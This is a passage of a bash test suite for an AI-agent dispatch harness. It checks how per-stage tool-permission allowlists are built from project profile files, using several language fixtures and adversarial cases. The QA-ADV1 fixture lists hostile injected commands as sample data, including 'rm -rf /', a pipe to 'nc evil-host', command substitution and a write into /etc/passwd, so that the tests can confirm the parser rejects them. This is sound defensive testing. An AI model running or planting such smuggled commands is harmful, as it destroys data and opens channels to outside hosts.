# This assertion is a static check on the committed config — if a future
# edit drops the entries, this trips.
printf '\n--- ENG-53 #8: harness profile populates dispatch.tools test-runner ---\n'
# .pipeline-config/ is gitignored — config.json is per-operator. This
# assertion warns the operator running tests against TARGET_REPO=harness
# if their local config drifts from the recommended dispatch.tools
# population. CI / other-target operators (file missing) skip silently.
HARNESS_CONFIG="$HARNESS_ROOT/.pipeline-config/config.json"
if [[ -f "$HARNESS_CONFIG" ]]; then
  expected_count="$(ls "$HARNESS_ROOT"/bin/*-test.sh 2>/dev/null | wc -l | tr -d ' ')"
  for stage in implementing qa; do
    has_broken_wildcard="$(jq -r --arg s "$stage" '
      (.dispatch.tools[$s] // []) as $arr
      | if ($arr | type) == "array"
        then $arr | any(. == "Bash(bash bin/*-test.sh:*)")
        else false end
    ' "$HARNESS_CONFIG" 2>/dev/null || printf 'false')"
    actual_count="$(jq -r --arg s "$stage" '
      (.dispatch.tools[$s] // []) as $arr
      | if ($arr | type) == "array"
        then [$arr[] | select(test("^Bash\\(bash bin/[^*]+-test\\.sh:\\*\\)$"))] | length
        else 0 end
    ' "$HARNESS_CONFIG" 2>/dev/null || printf '0')"
    if [[ "$has_broken_wildcard" == "true" ]]; then
      fail_at "ENG-53#8/ENG-77: harness config.json::dispatch.tools.${stage} contains broken wildcard Bash(bash bin/*-test.sh:*)" \
        "Claude's permission matcher does not expand the inner '*' as a glob — the pattern matches no actual test script. Replace with one literal Bash(bash bin/<name>-test.sh:*) entry per script. See CLAUDE.md '## Per-target dispatch.tools extras' for the regen one-liner."
    elif (( actual_count >= expected_count )); then
      pass_at "ENG-53#8: harness config.json::dispatch.tools.${stage} enumerates ${actual_count} test runners (>= ${expected_count} on disk)"
    else
      fail_at "ENG-53#8: harness config.json::dispatch.tools.${stage} only enumerates ${actual_count} test runners; ${expected_count} bin/*-test.sh files exist on disk" \
        "see CLAUDE.md '## Per-target dispatch.tools extras' for the regen one-liner."
    fi
  done
else
  printf 'SKIP ENG-53#8: %s not present (CI or non-harness target) — skipping config drift check\n' "$HARNESS_CONFIG"
fi

# ─── ENG-87 review-iter-7 M6: PIPELINE_DISPATCH_ID propagation pin ──
# bin/dispatch.sh's claude-invocation env-block carries PIPELINE_DISPATCH_ID
# + PIPELINE_STAGE so that bin/linear.sh's chokepoint sees them in the
# agent subprocess. The whole auto-injection contract collapses if a
# refactor drops or renames either env var. Pin source-level: the
# `env`-block / claude-invocation site must reference both names.
printf '\n--- ENG-87 review-iter-7 M6: PIPELINE_DISPATCH_ID env propagation ---\n'

DISP_SRC_FOR_M6="$SCRIPT_DIR/dispatch.sh"
if [[ -f "$DISP_SRC_FOR_M6" ]]; then
  if grep -qE 'PIPELINE_DISPATCH_ID' "$DISP_SRC_FOR_M6" && \
     grep -qE 'PIPELINE_STAGE' "$DISP_SRC_FOR_M6"; then
    pass_at "ENG-87 M6-iter7: dispatch.sh references PIPELINE_DISPATCH_ID and PIPELINE_STAGE (env-block pin)"
  else
    fail_at "ENG-87 M6-iter7: dispatch.sh references PIPELINE_DISPATCH_ID + PIPELINE_STAGE" \
      "either env var missing — auto-injection chokepoint relies on these reaching the agent subprocess via dispatch.sh's env block (~line 439-441)"
  fi
else
  printf 'SKIP ENG-87 M6-iter7: dispatch.sh not present at %s — skipping env-propagation pin\n' "$DISP_SRC_FOR_M6"
fi

# ─── ENG-94: dispatch.sh::allowed_tools_for consumes project-profile Tool allowlist ───
# Five fixtures exercising _dispatch_tools_from_profile + composition tail:
#   1. Tauri profile (back-compat) — implementing/ui/qa regain cargo/bun/rustc/npx/node
#      via profile, NOT via base.
#   2. Python profile — implementing/qa get pytest, NOT cargo.
#   3. Go profile — implementing/qa get `go test`, NOT cargo.
#   4. Fallback fixture (AC#3 warn branch) — schema_version 1 → empty + warning.
#   5. Empty-section fixture (AC#3 no-warn branch) — schema_version 2 with
#      `- implementing: (none)` → empty + NO warning.
#
# Each fixture overrides HARNESS_ROOT to a mktemp -d layout (matching the
# source-and-override pattern documented in bin/render-prompt-slug-test.sh:32–63).
# The pre-existing HARNESS_ROOT (set at line 2090 for the Gap-7 contract check)
# is restored at the end of each fixture so subsequent assertions are unaffected.
printf '\n--- ENG-94: project-profile Tool allowlist composition ---\n'
_ENG94_SAVED_HARNESS_ROOT="$HARNESS_ROOT"
_ENG94_SAVED_PROJECT_SLUG="$PROJECT_SLUG"

# Fixture 1 — Tauri profile (back-compat). Stub a schema_version 2 profile
# listing cargo/bun/rustc for implementing, cargo/bun/npx/node for ui, and
# cargo/bun/npx/node for qa. Assert each stage's composed return value
# contains the Tauri tokens via PROFILE (not via base).
_ENG94_TAURI_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_TAURI_ROOT"
mkdir -p "$_ENG94_TAURI_ROOT/learned-rules/eng94-tauri-slug"
cat > "$_ENG94_TAURI_ROOT/learned-rules/eng94-tauri-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-tauri-slug
generated_at: 2026-05-13T00:00:00Z
generated_by: eng94-test
schema_version: 2
---

# Project profile — eng94-tauri-slug

## Stack
Tauri (test fixture).

## Build & test gates
- Build: `bun tauri build`
- Test: `cargo test`
- Lint/check: `cargo clippy`
- Integration/E2E: `(n/a)`

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(rustc:*)`
- ui:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(npx:*)`
  - `Bash(node:*)`
- reviewing: (none)
- qa:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
  - `Bash(npx:*)`
  - `Bash(node:*)`
- building: (none)
- released: (none)

## File layout
- test fixture.

## Language idioms
- test.

## Don'ts
- none.
PROFILE
HARNESS_ROOT="$_ENG94_TAURI_ROOT"
PROJECT_SLUG="eng94-tauri-slug"
_ENG94_TAURI_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_TAURI_UI="$(allowed_tools_for ui 2>/dev/null)"
_ENG94_TAURI_QA="$(allowed_tools_for qa 2>/dev/null)"
for token in 'Bash(cargo:*)' 'Bash(bun:*)' 'Bash(rustc:*)'; do
  if [[ "$_ENG94_TAURI_IMPL" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): implementing carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): implementing missing $token" "got: $_ENG94_TAURI_IMPL"
  fi
done
for token in 'Bash(cargo:*)' 'Bash(bun:*)' 'Bash(npx:*)' 'Bash(node:*)'; do
  if [[ "$_ENG94_TAURI_UI" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): ui carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): ui missing $token" "got: $_ENG94_TAURI_UI"
  fi
  if [[ "$_ENG94_TAURI_QA" == *"$token"* ]]; then
    pass_at "ENG-94 Fixture 1 (Tauri): qa carries $token via profile"
  else
    fail_at "ENG-94 Fixture 1 (Tauri): qa missing $token" "got: $_ENG94_TAURI_QA"
  fi
done
# Pin AC#1: base no longer carries the tokens (the profile is the sole source).
# The composition is base,profile,extras — base should NOT contain cargo etc.
# We assert this by clearing the profile and re-checking:
HARNESS_ROOT="$_TEST_STUB_DIR/empty-root"  # no profile path → empty
mkdir -p "$HARNESS_ROOT"
_ENG94_BARE_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_ENG94_BARE_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 AC#1: implementing base (no profile) does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 AC#1: implementing base still carries Bash(cargo:*) after case-arm cleanup" \
    "got: $_ENG94_BARE_IMPL"
fi
HARNESS_ROOT="$_ENG94_TAURI_ROOT"  # restore for any subsequent reference
_test_safe_rm "$_ENG94_TAURI_ROOT"

# Fixture 2 — Python profile. Stub a schema_version 2 profile listing
# pytest/pip/python3 for implementing AND qa. Assert each stage's composed
# output contains pytest via profile and does NOT contain cargo (case-arm
# cleanup removed cargo from base).
_ENG94_PYTHON_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_PYTHON_ROOT"
mkdir -p "$_ENG94_PYTHON_ROOT/learned-rules/eng94-python-slug"
cat > "$_ENG94_PYTHON_ROOT/learned-rules/eng94-python-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-python-slug
schema_version: 2
---

# Project profile — eng94-python-slug

## Stack
Python (test fixture).

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(pytest:*)`
  - `Bash(pip:*)`
  - `Bash(python3:*)`
- ui: (none)
- reviewing: (none)
- qa:
  - `Bash(pytest:*)`
  - `Bash(pip:*)`
  - `Bash(python3:*)`
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_PYTHON_ROOT"
PROJECT_SLUG="eng94-python-slug"
_ENG94_PY_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_PY_QA="$(allowed_tools_for qa 2>/dev/null)"
if [[ "$_ENG94_PY_IMPL" == *'Bash(pytest:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): implementing carries Bash(pytest:*) via profile"
else
  fail_at "ENG-94 Fixture 2 (Python): implementing missing Bash(pytest:*)" "got: $_ENG94_PY_IMPL"
fi
if [[ "$_ENG94_PY_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): implementing does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 2 (Python): implementing unexpectedly contains Bash(cargo:*)" "got: $_ENG94_PY_IMPL"
fi
if [[ "$_ENG94_PY_QA" == *'Bash(pytest:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): qa carries Bash(pytest:*) via profile"
else
  fail_at "ENG-94 Fixture 2 (Python): qa missing Bash(pytest:*)" "got: $_ENG94_PY_QA"
fi
if [[ "$_ENG94_PY_QA" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 2 (Python): qa does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 2 (Python): qa unexpectedly contains Bash(cargo:*)" "got: $_ENG94_PY_QA"
fi
_test_safe_rm "$_ENG94_PYTHON_ROOT"

# Fixture 3 — Go profile. Stub a schema_version 2 profile listing
# go test/go build/go vet/gofmt for implementing AND qa. The `go test`
# pattern's internal space exercises the awk regex's tolerance of
# multi-word command names.
_ENG94_GO_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_GO_ROOT"
mkdir -p "$_ENG94_GO_ROOT/learned-rules/eng94-go-slug"
cat > "$_ENG94_GO_ROOT/learned-rules/eng94-go-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-go-slug
schema_version: 2
---

# Project profile — eng94-go-slug

## Stack
Go (test fixture).

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing:
  - `Bash(go test:*)`
  - `Bash(go build:*)`
  - `Bash(go vet:*)`
  - `Bash(gofmt:*)`
- ui: (none)
- reviewing: (none)
- qa:
  - `Bash(go test:*)`
  - `Bash(go build:*)`
  - `Bash(go vet:*)`
  - `Bash(gofmt:*)`
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_GO_ROOT"
PROJECT_SLUG="eng94-go-slug"
_ENG94_GO_IMPL="$(allowed_tools_for implementing 2>/dev/null)"
_ENG94_GO_QA="$(allowed_tools_for qa 2>/dev/null)"
if [[ "$_ENG94_GO_IMPL" == *'Bash(go test:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): implementing carries Bash(go test:*) via profile"
else
  fail_at "ENG-94 Fixture 3 (Go): implementing missing Bash(go test:*)" "got: $_ENG94_GO_IMPL"
fi
if [[ "$_ENG94_GO_IMPL" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): implementing does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 3 (Go): implementing unexpectedly contains Bash(cargo:*)" "got: $_ENG94_GO_IMPL"
fi
if [[ "$_ENG94_GO_QA" == *'Bash(go test:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): qa carries Bash(go test:*) via profile"
else
  fail_at "ENG-94 Fixture 3 (Go): qa missing Bash(go test:*)" "got: $_ENG94_GO_QA"
fi
if [[ "$_ENG94_GO_QA" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 3 (Go): qa does NOT contain Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 3 (Go): qa unexpectedly contains Bash(cargo:*)" "got: $_ENG94_GO_QA"
fi
_test_safe_rm "$_ENG94_GO_ROOT"

# Fixture 4 — Fallback (AC#3 warn branch). Stub a schema_version 1 profile
# (no Tool allowlist section). Capture stderr; assert composed output is
# empty of stack tokens, exactly one warning fires, helper returns 0.
_ENG94_FB_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_FB_ROOT"
mkdir -p "$_ENG94_FB_ROOT/learned-rules/eng94-fallback-slug"
cat > "$_ENG94_FB_ROOT/learned-rules/eng94-fallback-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-fallback-slug
schema_version: 1
---
# Project profile — eng94-fallback-slug
## Stack
test fixture.
PROFILE
HARNESS_ROOT="$_ENG94_FB_ROOT"
PROJECT_SLUG="eng94-fallback-slug"
_ENG94_FB_STDERR="$(mktemp)"
_test_assert_temp_path "$_ENG94_FB_STDERR"
_ENG94_FB_OUT="$(allowed_tools_for implementing 2>"$_ENG94_FB_STDERR")"
_ENG94_FB_RC=$?
if (( _ENG94_FB_RC == 0 )); then
  pass_at "ENG-94 Fixture 4 (Fallback): allowed_tools_for returns 0 (does NOT die on schema v1)"
else
  fail_at "ENG-94 Fixture 4 (Fallback): allowed_tools_for exited non-zero (rc=$_ENG94_FB_RC)" ""
fi
if [[ "$_ENG94_FB_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 4 (Fallback): composed output lacks Bash(cargo:*) (AC#3 + AC#1)"
else
  fail_at "ENG-94 Fixture 4 (Fallback): composed output unexpectedly contains Bash(cargo:*)" "got: $_ENG94_FB_OUT"
fi
_ENG94_FB_WARN_COUNT="$(grep -cE '\[allowed-tools\] project-profile.md schema_version != 2' "$_ENG94_FB_STDERR" 2>/dev/null || true)"
if [[ "$_ENG94_FB_WARN_COUNT" == "1" ]]; then
  pass_at "ENG-94 Fixture 4 (Fallback): exactly one schema-version warning fired"
else
  fail_at "ENG-94 Fixture 4 (Fallback): expected 1 schema-version warning, got $_ENG94_FB_WARN_COUNT" \
    "stderr: $(cat "$_ENG94_FB_STDERR")"
fi
rm -f "$_ENG94_FB_STDERR"
_test_safe_rm "$_ENG94_FB_ROOT"

# Fixture 5 — Empty-section (AC#3 no-warn branch). Stub a schema_version 2
# profile with present-but-empty Tool allowlist for implementing
# (`- implementing: (none)`). Assert composed output lacks profile tokens
# AND zero `[allowed-tools]` warnings fire.
_ENG94_ES_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_ENG94_ES_ROOT"
mkdir -p "$_ENG94_ES_ROOT/learned-rules/eng94-empty-slug"
cat > "$_ENG94_ES_ROOT/learned-rules/eng94-empty-slug/project-profile.md" <<'PROFILE'
---
slug: eng94-empty-slug
schema_version: 2
---
# Project profile — eng94-empty-slug
## Stack
test fixture.

## Tool allowlist
- brainstorming: (none)
- planning: (none)
- implementing: (none)
- ui: (none)
- reviewing: (none)
- qa: (none)
- building: (none)
- released: (none)
PROFILE
HARNESS_ROOT="$_ENG94_ES_ROOT"
PROJECT_SLUG="eng94-empty-slug"
_ENG94_ES_STDERR="$(mktemp)"
_test_assert_temp_path "$_ENG94_ES_STDERR"
_ENG94_ES_OUT="$(allowed_tools_for implementing 2>"$_ENG94_ES_STDERR")"
if [[ "$_ENG94_ES_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "ENG-94 Fixture 5 (Empty-section): composed output lacks Bash(cargo:*)"
else
  fail_at "ENG-94 Fixture 5 (Empty-section): composed output unexpectedly contains Bash(cargo:*)" "got: $_ENG94_ES_OUT"
fi
_ENG94_ES_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_ENG94_ES_STDERR" 2>/dev/null || true)"
if [[ "$_ENG94_ES_WARN_COUNT" == "0" ]]; then
  pass_at "ENG-94 Fixture 5 (Empty-section): no [allowed-tools] warning fired (no-warn discrimination)"
else
  fail_at "ENG-94 Fixture 5 (Empty-section): unexpected [allowed-tools] warning(s) fired" \
    "stderr: $(cat "$_ENG94_ES_STDERR")"
fi
rm -f "$_ENG94_ES_STDERR"
_test_safe_rm "$_ENG94_ES_ROOT"

# ─── ENG-94 QA-authored adversarial coverage (QA-ADV 1..7) ───────────────
# Six categories the plan's Failure Mode -> Test Map either deferred ("future
# work" / "no synthetic test") or left implicit. Concurrency is N/A: the
# helper is purely functional and the orchestrator's claude_mutex serializes
# dispatches, so two parallel reads cannot race. Pinned here so a future
# refactor that accidentally widens the surface (e.g. a metachar leak, a
# cross-stage bleed, a stray-comma regression in the composition tail) is
# caught at unit time rather than empirically post-deploy.
printf '\n--- ENG-94 QA-authored adversarial (QA-ADV) ---\n'

# QA-ADV 1 — D-8 shell-metachar hygiene. Profile lists `Bash(cargo:*)` plus
# seven metachar-bearing payloads. Assert only the clean pattern reaches the
# composed output and the rejection emits NO stderr warning (the awk filter
# silently `next`s past metachars per the implementation — no `log` call).
# Also assert the warning surface (if any future regression starts logging)
# does NOT leak the pattern text per D-8's "Why" + ENG-46.
_QA_ADV1_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV1_ROOT"
mkdir -p "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug"
cat > "$_QA_ADV1_ROOT/learned-rules/qa-adv1-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv1-slug
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
  - `Bash(echo X; rm -rf /:*)`
  - `Bash(curl $(whoami):*)`
  - `Bash(node | nc evil-host:*)`
  - `Bash(go test > /etc/passwd:*)`
  - `Bash(rm & sleep 1:*)`
  - `Bash(echo `whoami`:*)`
  - `Bash(foo(:*)`
- qa: (none)
PROFILE
HARNESS_ROOT="$_QA_ADV1_ROOT"
PROJECT_SLUG="qa-adv1-slug"
_QA_ADV1_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV1_STDERR"
_QA_ADV1_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV1_STDERR")"
if [[ "$_QA_ADV1_OUT" == *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) reaches composed output"
else
  fail_at "QA-ADV1 (D-8 hygiene): clean Bash(cargo:*) missing from composed output" "got: $_QA_ADV1_OUT"
fi
for bad in 'rm -rf /' 'whoami' 'nc evil-host' '/etc/passwd' 'sleep 1' 'echo `'; do
  if [[ "$_QA_ADV1_OUT" != *"$bad"* ]]; then
    pass_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] dropped from composed output"
  else
    fail_at "QA-ADV1 (D-8 hygiene): metachar payload [$bad] leaked into composed output" "got: $_QA_ADV1_OUT"
  fi
done
# Paren-imbalance rejection — `Bash(foo(:*)` has unbalanced parens after the
# parser's outer-paren strip and should be dropped.
if [[ "$_QA_ADV1_OUT" != *'Bash(foo(:*)'* ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) dropped"
else
  fail_at "QA-ADV1 (D-8 hygiene): paren-imbalance payload Bash(foo(:*) leaked" "got: $_QA_ADV1_OUT"
fi
# Stderr must NOT contain any pattern fragment (ENG-46 + D-8: warnings never
# echo matched pattern text). The metachar branch emits no warning at all
# per implementation; this assertion future-pins that property.
_QA_ADV1_STDERR_BODY="$(cat "$_QA_ADV1_STDERR" 2>/dev/null || true)"
_QA_ADV1_LEAKED=""
for bad in 'rm -rf' 'whoami' 'nc evil-host' '/etc/passwd' 'foo('; do
  if [[ "$_QA_ADV1_STDERR_BODY" == *"$bad"* ]]; then
    _QA_ADV1_LEAKED="$_QA_ADV1_LEAKED [$bad]"
  fi
done
if [[ -z "$_QA_ADV1_LEAKED" ]]; then
  pass_at "QA-ADV1 (D-8 hygiene): stderr does NOT leak any metachar pattern fragment (ENG-46 invariant)"
else
  fail_at "QA-ADV1 (D-8 hygiene): stderr leaked pattern fragment(s):$_QA_ADV1_LEAKED" "stderr: $_QA_ADV1_STDERR_BODY"
fi
rm -f "$_QA_ADV1_STDERR"
_test_safe_rm "$_QA_ADV1_ROOT"

# QA-ADV 2 — Cross-stage isolation. Profile lists implementing+qa with
# DISTINCT tokens and omits `ui`. Assert ui composed output lacks both
# stages' profile-derived tokens (no neighbor-stage bleed).
_QA_ADV2_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV2_ROOT"
mkdir -p "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug"
cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv2-slug
## Tool allowlist
- implementing:
  - `Bash(pytest:*)`
- qa:
  - `Bash(ruff:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV2_ROOT"
PROJECT_SLUG="qa-adv2-slug"
_QA_ADV2_UI="$(allowed_tools_for ui 2>/dev/null)"
if [[ "$_QA_ADV2_UI" != *'Bash(pytest:*)'* && "$_QA_ADV2_UI" != *'Bash(ruff:*)'* ]]; then
  pass_at "QA-ADV2 (cross-stage isolation): ui composed lacks implementing/qa profile tokens"
else
  fail_at "QA-ADV2 (cross-stage isolation): ui composed leaked neighbor-stage tokens" "got: $_QA_ADV2_UI"
fi
# Stage-name prefix-match false-positive. The helper's `current_stage == STAGE`
# guard is exact-match awk equality — pin this by giving the profile an
# `- implement:` key (no `-ing` suffix) AND a real `- implementing:` key with
# distinct payload, then querying `implementing`. The implementing query MUST
# carry only its own tokens; the `implement` tokens MUST NOT leak.
cat > "$_QA_ADV2_ROOT/learned-rules/qa-adv2-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
# Project profile — qa-adv2-slug
## Tool allowlist
- implement:
  - `Bash(SHOULD_NOT_LEAK:*)`
- implementing:
  - `Bash(pytest:*)`
PROFILE
_QA_ADV2_IMPL2="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV2_IMPL2" == *'Bash(pytest:*)'* && "$_QA_ADV2_IMPL2" != *'SHOULD_NOT_LEAK'* ]]; then
  pass_at "QA-ADV2 (prefix isolation): \`- implement:\` key does NOT bleed into \`implementing\` query"
else
  fail_at "QA-ADV2 (prefix isolation): \`- implement:\` token leaked into \`implementing\` query" "got: $_QA_ADV2_IMPL2"
fi
_test_safe_rm "$_QA_ADV2_ROOT"

# QA-ADV 3 — Composition shape. No profile + no extras must produce a clean
# base with no `,,` (double-comma) and no trailing `,`. The empty-segment
# elision in `allowed_tools_for`'s composition tail (`[[ -n "$profile_tools" ]] && ...`)
# is the load-bearing guard; pin its observable shape.
HARNESS_ROOT="$_TEST_STUB_DIR/empty-root-qa-adv3"
mkdir -p "$HARNESS_ROOT"
PROJECT_SLUG="qa-adv3-no-profile"
_QA_ADV3_OUT="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV3_OUT" != *,,* ]]; then
  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no double-comma"
else
  fail_at "QA-ADV3 (composition shape): composed output contains a double-comma" "got: $_QA_ADV3_OUT"
fi
if [[ "$_QA_ADV3_OUT" != *, ]]; then
  pass_at "QA-ADV3 (composition shape): empty profile + empty extras produces no trailing comma"
else
  fail_at "QA-ADV3 (composition shape): composed output has trailing comma" "got: $_QA_ADV3_OUT"
fi

# QA-ADV 4 — CRLF graceful-handling. The implementation's main awk parser
# carries a `sub(/\r$/, "")` line, suggesting CRLF tolerance intent. The
# schema-version detector awk above it (bin/dispatch.sh:328-332) does NOT
# strip CRLF — surfaced by this fixture during QA adversarial coverage. The
# plan does NOT promise CRLF tolerance (the discovery-agent writer emits
# LF-only via bash heredoc), so the OBSERVABLE contract under a CRLF profile
# is: (a) helper returns 0 (no die), (b) composed output is well-formed
# (no stray commas, no half-parsed pattern fragments), (c) either patterns
# parse OR a single schema-version warning fires. Fully-tolerant CRLF
# parsing is a follow-up (see PR summary).
_QA_ADV4_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV4_ROOT"
mkdir -p "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug"
{
  printf -- '---\r\n'
  printf -- 'schema_version: 2\r\n'
  printf -- '---\r\n'
  printf -- '# Project profile\r\n'
  printf -- '## Tool allowlist\r\n'
  printf -- '- implementing:\r\n'
  printf -- '  - `Bash(cargo:*)`\r\n'
  printf -- '  - `Bash(bun:*)`\r\n'
} > "$_QA_ADV4_ROOT/learned-rules/qa-adv4-slug/project-profile.md"
HARNESS_ROOT="$_QA_ADV4_ROOT"
PROJECT_SLUG="qa-adv4-slug"
_QA_ADV4_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV4_STDERR"
_QA_ADV4_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV4_STDERR")"
_QA_ADV4_RC=$?
if (( _QA_ADV4_RC == 0 )); then
  pass_at "QA-ADV4 (CRLF graceful): helper returns 0 against CRLF profile (no die)"
else
  fail_at "QA-ADV4 (CRLF graceful): helper exited non-zero against CRLF profile (rc=$_QA_ADV4_RC)" ""
fi
if [[ "$_QA_ADV4_OUT" != *,,* && "$_QA_ADV4_OUT" != *, ]]; then
  pass_at "QA-ADV4 (CRLF graceful): composed output is well-formed (no stray commas / trailing comma)"
else
  fail_at "QA-ADV4 (CRLF graceful): composed output is malformed under CRLF input" "got: $_QA_ADV4_OUT"
fi
# Either patterns load (LF parser tolerated CRLF) OR a single schema-version
# warning fires (current behavior: schema-version awk fails to detect v2 due
# to un-stripped \r). Both are acceptable graceful-handling outcomes — the
# contract is "no silent half-parse, no crash". Pin BOTH branches so a
# future fully-CRLF-tolerant fix flips cleanly.
_QA_ADV4_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV4_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV4_OUT" == *'Bash(cargo:*)'* ]] || [[ "$_QA_ADV4_WARN_COUNT" -ge 1 ]]; then
  pass_at "QA-ADV4 (CRLF graceful): either patterns parse OR schema-version warning fires (current: warn fires)"
else
  fail_at "QA-ADV4 (CRLF graceful): silent half-parse — neither patterns loaded nor warning fired" \
    "stderr: $(cat "$_QA_ADV4_STDERR") | got: $_QA_ADV4_OUT"
fi
rm -f "$_QA_ADV4_STDERR"
_test_safe_rm "$_QA_ADV4_ROOT"

# QA-ADV 5 — HARNESS_ROOT / PROJECT_SLUG empty -> empty + NO warning (D-3
# first bullet: symmetric with _dispatch_tools_extras's `[[ -f "$CONFIG" ]] || return 0`).
# The fail-soft branch must be SILENT (no `log` warning) — this is the
# discriminator between "no profile configured" and "profile present but
# malformed", and Fixture 4 only covers the latter.
_QA_ADV5_STDERR="$(mktemp)"
_test_assert_temp_path "$_QA_ADV5_STDERR"
HARNESS_ROOT=""
PROJECT_SLUG=""
_QA_ADV5_OUT="$(allowed_tools_for implementing 2>"$_QA_ADV5_STDERR")"
_QA_ADV5_WARN_COUNT="$(grep -cE '\[allowed-tools\]' "$_QA_ADV5_STDERR" 2>/dev/null || true)"
if [[ "$_QA_ADV5_OUT" != *'Bash(cargo:*)'* ]]; then
  pass_at "QA-ADV5 (HARNESS_ROOT empty): composed output lacks profile tokens"
else
  fail_at "QA-ADV5 (HARNESS_ROOT empty): composed output unexpectedly carries Bash(cargo:*)" "got: $_QA_ADV5_OUT"
fi
if [[ "$_QA_ADV5_WARN_COUNT" == "0" ]]; then
  pass_at "QA-ADV5 (HARNESS_ROOT empty): NO [allowed-tools] warning fired (silent fallback per D-3)"
else
  fail_at "QA-ADV5 (HARNESS_ROOT empty): expected 0 warnings, got $_QA_ADV5_WARN_COUNT" \
    "stderr: $(cat "$_QA_ADV5_STDERR")"
fi
rm -f "$_QA_ADV5_STDERR"

# QA-ADV 6 — Idempotency. Two sequential calls with identical inputs must
# return byte-identical output. The helper has no shared state, but awk's
# variable scoping in BEGIN blocks across multiple invocations is a
# historically flaky surface; pin the property.
_QA_ADV6_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV6_ROOT"
mkdir -p "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug"
cat > "$_QA_ADV6_ROOT/learned-rules/qa-adv6-slug/project-profile.md" <<'PROFILE'
---
schema_version: 2
---
## Tool allowlist
- implementing:
  - `Bash(cargo:*)`
  - `Bash(bun:*)`
PROFILE
HARNESS_ROOT="$_QA_ADV6_ROOT"
PROJECT_SLUG="qa-adv6-slug"
_QA_ADV6_FIRST="$(allowed_tools_for implementing 2>/dev/null)"
_QA_ADV6_SECOND="$(allowed_tools_for implementing 2>/dev/null)"
if [[ "$_QA_ADV6_FIRST" == "$_QA_ADV6_SECOND" ]]; then
  pass_at "QA-ADV6 (idempotency): two sequential allowed_tools_for calls produce byte-identical output"
else
  fail_at "QA-ADV6 (idempotency): outputs diverge between sequential calls" \
    "first: $_QA_ADV6_FIRST | second: $_QA_ADV6_SECOND"
fi
_test_safe_rm "$_QA_ADV6_ROOT"

# QA-ADV 7 — Frontmatter present but schema_version line absent. Distinct
# from Fixture 4 (which pins schema_version: 1 explicitly). Should also
# fall through with ONE warning, NOT silently load a default.
_QA_ADV7_ROOT="$(mktemp -d)"
_test_assert_temp_path "$_QA_ADV7_ROOT"
mkdir -p "$_QA_ADV7_ROOT/learned-rules/qa-adv7-slug"
